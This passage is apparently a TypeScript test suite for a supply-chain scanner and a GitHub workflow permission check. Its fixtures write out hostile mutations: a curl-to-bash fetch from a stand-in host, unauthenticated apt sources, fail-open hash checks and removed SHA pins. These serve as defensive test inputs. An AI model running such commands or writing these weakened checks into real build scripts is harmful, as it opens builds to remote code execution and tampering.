      () => add('curl -fsSLo /tmp/x https://e.invalid/x\nbash /tmp/x'),
    ],
    ['apt-get install of an unpinned package', () => sub('unzip python3', 'unzip evilpkg python3')],
    [
      'rev-parse == UPSTREAM_SHA check removed',
      () => sub('test "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"\n', ''),
    ],
    [
      'git fetch origin main instead of the SHA',
      () => sub('origin "$UPSTREAM_SHA"', 'origin main'),
    ],
    [
      'SHASUMS cross-check turned into true ||',
      () => sub('grep -qxF "$(grep -E', 'true || grep -qxF "$(grep -E'),
    ],
    [
      'sha256sum -c - || true (fail-open pin)',
      () => sub('sha256sum -c -\n}', 'sha256sum -c - || true\n}'),
    ],
    ['a pin removed from a curl', () => sub('(cd /tmp && pin rustup-init)', 'true')],
    ['an unlisted curl added', () => add('curl -fsSLO https://e.invalid/y')],
    [
      'pin() check swallowed with ||:',
      () => sub('pin bun-linux-x64.zip\n', 'pin bun-linux-x64.zip || :\n'),
    ],
    ['webkit pin removed', () => sub('(cd /tmp/wk && pin "$wkfile")', 'true')],
    // round 3 greens
    ['timeout 600 curl', () => add('timeout 600 curl https://e.invalid/t')],
    ['env curl', () => add('env curl https://e.invalid/t')],
    ['command curl', () => add('command curl https://e.invalid/t')],
    ['git -C dir fetch origin main', () => add('git -C "$SRC" fetch origin main')],
    ['bun -e fetch', () => add(`bun -e 'fetch("https://e.invalid")'`)],
    ['bunx pkg', () => add('bunx some-pkg')],
    ['aria2c', () => add('aria2c https://e.invalid/a')],
    ['go run mod@latest', () => add('go run example.invalid/m@latest')],
    ['cmake -P', () => add('cmake -P /tmp/x.cmake')],
    ['pin() early return 0', () => sub('  local line\n', '  return 0\n  local line\n')],
    ['WebKit consumption check deleted', () => sub(`  ${CONSUMED}\n`, '')],
    [
      'apt-get --allow-unauthenticated',
      () =>
        sub('apt-get install -y -qq curl', 'apt-get install -y -qq --allow-unauthenticated curl'),
    ],
    [
      'a [trusted=yes] apt source',
      () =>
        add('echo "deb [trusted=yes] http://e.invalid/ x main" >/etc/apt/sources.list.d/x.list'),
    ],
    ['xargs curl', () => add('echo https://e.invalid | xargs curl -fsSLo /tmp/q')],
    [
      'pinned file used before its pin',
      () => sub('pin bun-linux-x64.zip\n', 'unzip -q bun-linux-x64.zip\npin bun-linux-x64.zip\n'),
    ],
    [
      'pin as an if condition',
      () => sub('pin bun-linux-x64.zip\n', 'if pin bun-linux-x64.zip; then echo ok; fi\n'),
    ],
    ['pin before &&', () => sub('pin bun-linux-x64.zip\n', 'pin bun-linux-x64.zip && echo ok\n')],
    [
      'loop in an || list',
      () => sub('  lap "build-$arch"\ndone', '  lap "build-$arch"\ndone || echo x'),
    ],
    ['export of a proxy variable', () => add('export https_proxy=http://e.invalid:3128')],
    [
      'backgrounded fetch',
      () => add('curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z &\npin bun-linux-x64.zip'),
    ],
  ])('goes RED on: %s', (_n, mutate) => {
    expect(scan(mutate()).length).toBeGreaterThan(0);
  });

  it('positive control: a correctly pinned extra fetch stays green', () => {
    expect(
      scan(add('curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z\npin bun-linux-x64.zip')),
    ).toEqual([]);
  });

  it('positive control: a wrapped but correctly pinned fetch stays green', () => {
    expect(
      scan(
        add(
          'timeout 600 curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z\npin bun-linux-x64.zip',
        ),
      ),
    ).toEqual([]);
  });

  it('positive control: `cmd || { echo …; exit 1; }` stays green', () => {
    expect(scan(add('test -d /tmp || { echo "no /tmp" >&2; exit 1; }'))).toEqual([]);
  });
});

describe('bun-base-build.yml: credentialed job triggers and permissions', () => {
  const wfText = readFileSync(
    resolve(dir, '..', '..', '.github/workflows/bun-base-build.yml'),
    'utf8',
  );
  const problems = (t: string): string[] => {
    const doc = parse(t) as {
      on?: unknown;
      permissions?: unknown;
      jobs?: Record<string, { permissions?: unknown }>;
    };
    const out: string[] = [];
    const on = doc.on;
    const triggers = typeof on === 'string' ? [on] : Object.keys((on ?? {}) as object);
    for (const tr of triggers)
      if (!['workflow_dispatch', 'schedule'].includes(tr)) out.push(`trigger ${tr}`);
    if (
      /pull_request_target/.test(
        t
          .split('\n')
          .filter((l) => !l.trimStart().startsWith('#'))
          .join('\n'),
      )
    )
      out.push('pull_request_target');
    const perms = [doc.permissions, ...Object.values(doc.jobs ?? {}).map((j) => j.permissions)];
    for (const p of perms) {
      if (p === undefined) continue;
      for (const [k, val] of Object.entries((p ?? {}) as Record<string, string>)) {
        const ok = (k === 'contents' && val === 'read') || (k === 'id-token' && val === 'write');
        if (!ok) out.push(`permission ${k}: ${val}`);
      }
    }
    return out;
  };

  it('has only workflow_dispatch/schedule triggers and only contents:read + id-token:write', () => {
    expect(problems(wfText)).toEqual([]);
  });

  it.each([
    [
      'a pull_request_target trigger',
      (t: string) => t.replace('on:\n', 'on:\n  pull_request_target:\n'),
    ],
    ['a pull_request trigger', (t: string) => t.replace('on:\n', 'on:\n  pull_request:\n')],
    ['contents: write', (t: string) => t.replace('contents: read', 'contents: write')],
    [
      'packages: write',
      (t: string) => t.replace('contents: read', 'contents: read\n      packages: write'),
    ],
  ])('goes RED on: %s', (_n, mutate) => {
    expect(mutate(wfText)).not.toBe(wfText);
    expect(problems(mutate(wfText)).length).toBeGreaterThan(0);
  });
});
